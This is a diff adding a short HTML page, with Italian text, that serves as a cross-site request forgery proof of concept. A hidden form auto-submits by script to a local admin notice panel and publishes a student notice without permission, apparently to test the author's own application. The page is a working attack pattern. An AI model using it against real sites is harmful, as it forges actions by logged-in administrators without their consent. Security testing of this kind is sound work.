@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h2>Pagina "innocua" — aprendo questa pagina, la notice viene pubblicata da sola</h2>
+<form id="csrfForm" action="http://localhost:8080/Admin/notice_panel.php" method="POST">
+    <input type="hidden" name="student_notice_date" value="2026-01-01">
+    <input type="hidden" name="student_notice_name" value="CSRF TEST - pubblicata senza permesso">
+    <input type="hidden" name="student_notice_des" value="Questa notice e' stata creata da una pagina esterna">
+    <input type="hidden" name="add_notice_student" value="1">
+</form>
+<script>document.getElementById('csrfForm').submit();</script>
+</body>
+</html>
